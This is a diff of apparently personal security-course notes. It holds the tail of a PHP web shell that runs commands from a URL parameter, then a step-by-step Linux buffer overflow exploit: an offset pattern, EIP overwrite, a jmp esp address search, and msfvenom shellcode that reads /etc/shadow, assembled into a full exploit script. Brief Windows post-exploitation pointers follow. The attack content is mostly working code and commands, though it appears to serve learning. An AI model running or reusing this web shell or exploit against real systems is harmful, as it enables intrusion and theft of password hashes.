@@ -72,7 +72,83 @@ if($_GET['cmd']) {
   system($_GET['cmd']);
 }
 ?>
-========================================================================================================================
-
 </pre>
 </BODY></HTML>
+========================================================================================================================
+      <<<<< Buffer Overflow >>>>>
+Orginal Notes      |      https://github.com/Stephens5824/COSC/blob/Main/Security/Exploit%20Development
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+https://z3r0th.medium.com/a-simple-buffer-overflow-using-vulnserver-86b011eb673b      :Windows Ex.
+-------------------------------------------------------------------------------------------------------------------------
+-- find vulnerable function via gdb on lin-Ops
+vim lin_buf.py
+{
+  1 overflow = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7A    c8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag    0Ag1Ag2Ag3Ag4Ag5Ag"
+  2 
+  3 print(overflow)
+}
+gdb-peda$ run <<< $(python lin_buf.py)
+grab eip and put into register value
+{
+  1 overflow = "A" *62
+  2 eip = "B" *4
+  3 print(overflow + eip)
+}
+gdb-peda$ run <<< $(python lin_buf.py)
+show env
+-- unset whatever shows up
+run
+spam A
+info proc map
+-- grab start under the heap and the end above the stack
+find /b <1st start addr under the heap>,<1st end addr above the stack>,0xff,0xe4
+{
+  1 overflow = "A" *62
+  2 eip = "\xef\x59\xf6\xf7" 
+  3 '''
+  4 0xf7f659ef
+  5 0xf7f67203
+  6 '''
+  7 print(overflow + eip)
+}
+msfvenom -p linux/x86/exec CMD="cat /etc/shadow" -b '\x00' -f python
+{
+  1 overflow = "A" *62
+  2 eip = "\xef\x59\xf6\xf7"
+  3 '''
+  4 0xf7f659ef
+  5 0xf7f67203
+  6 '''
+  7 nop = '\x90' *10
+  8 buf =  b""
+  9 buf += b"\xba\xaa\x8f\x64\x55\xd9\xe5\xd9\x74\x24\xf4\x58"
+ 10 buf += b"\x2b\xc9\xb1\x0d\x31\x50\x15\x03\x50\x15\x83\xe8"
+ 11 buf += b"\xfc\xe2\x5f\xe5\x6f\x0d\x06\xa8\x09\xc5\x15\x2e"
+ 12 buf += b"\x5f\xf2\x0d\x9f\x2c\x95\xcd\xb7\xfd\x07\xa4\x29"
+ 13 buf += b"\x8b\x2b\x64\x5e\x9b\xab\x88\x9e\xff\xca\xfc\xbe"
+ 14 buf += b"\xd0\x69\x88\xdd\x01\x01\x18\x43\x3a\x8a\xaf\x83"
+ 15 buf += b"\x95\x07\xc6\x65\xd4\x28"
+ 16 print(overflow + eip + nop + buf)
+}
+run <file> <<< $(python lin_buf.py)
+==========================================================================================================================
+Linux Kernel
+uname -a
+
+rsyslog
+/etc/rsyslog.conf
+
+Windows Post-Ex
+RUNKEYS!
+C:\Users
+In explorer:
+      top left "File"
+      top right "View Hidden Files"
+
+Security Policies
+auditpol /get /category:*
+#### MUST BE A PRIVILEGED USER ####
+#### MUST BE A PRIVILEGED RUNAS FOR CMD ####
+
+C Code
+>> << both indicate bit shift
